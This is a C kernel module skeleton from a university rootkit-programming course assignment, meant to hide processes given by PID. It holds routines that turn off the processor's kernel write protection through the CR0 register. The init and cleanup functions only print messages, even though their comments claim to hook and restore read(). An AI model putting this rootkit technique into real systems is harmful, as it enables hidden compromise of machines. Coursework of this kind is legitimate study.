/*
 * Assignment 02 for the course Rootkit Programming at TUM in WS2014/15.
 * Implemented by Guru Chandrasekhara and Martin Herrmann.
 */
#include <linux/module.h>
#include <linux/kernel.h>
#include <asm/page.h>
#include "sysmap.h"
#include <linux/unistd.h>

/* Information for modinfo */
MODULE_LICENSE("GPL");
MODULE_AUTHOR("Guru Chandrasekhara, Martin Herrmann");



/* Define module parameters */
static int hideprocess_argcount = 0;
static pid_t hideprocess_processes[16] = {-1, -1, -1 , -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1};

module_param_array(hideprocess_processes, pid_t, hideprocess_argcount, 0000);
MODULE_PARM_DESC(hideprocess_processes, "An array of process ids to hide");



/*
 * Disable the writing protection for the whole processor.
 */
static void disable_page_protection (void)
{
	unsigned long value;
	asm volatile("mov %%cr0,%0" : "=r" (value));
	if (value & 0x00010000)
	{
		value &= ~0x00010000;
		asm volatile("mov %0,%%cr0": : "r" (value));
	}
}

/*
 * Reenable the writing protection for the whole processor.
 */
static void enable_page_protection (void)
{
	unsigned long value;
	asm volatile("mov %%cr0,%0" : "=r" (value));
	if (!(value & 0x00010000))
	{
		value |= 0x00010000;
		asm volatile("mov %0,%%cr0": : "r" (value));
    	}
}

/*
 * Function called when loading the kernel module.
 * Prints a welcome-message and replaces the read() syscall.
 */
int init_module (void)
{
	printk(KERN_INFO "Loading process-hider LKM...\n");
	
	return 0;
}

/*
 * Function called when unloading the kernel module.
 * Prints a goodbye-message and restores the original read() syscall.
 */
void cleanup_module (void)
{


	/* Finally, log the unloading */
	printk(KERN_INFO "Unloading process-hider... bye!\n");
}
